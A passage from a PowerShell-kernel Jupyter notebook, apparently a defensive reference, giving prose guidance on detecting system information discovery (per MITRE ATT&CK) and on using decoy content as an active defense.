   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations."
  },
  {
   "cell_type": "markdown",
   "id": "50c8463e",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Content  \n Seed content that can be used to lead an adversary in a specific direction, entice a behavior, etc. \n\n Decoy Content is the data used to tell a story to an adversary. This content can be legitimate or synthetic data which is used to reinforce or validate your defensive strategy. Examples of decoy content are files on a storage object, entries in the system registry, system shortcuts, etc.\n#### Opportunity\nThere is an opportunity to feed content to an adversary to influence their behaviors, test their interest in specific topics, or add legitimacy to a system or environment.\n#### Use Case\nA defender can use decoy content to give the false impression about the system when an adversary performs system information discovery.\n#### Procedures\nCreate directories and files with names and contents using key words that may be relevant to an adversary to see if they examine or exfiltrate the data.\nSeed a file system with content that is of no value to the company but reinforces the legitimacy of the system if viewed by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}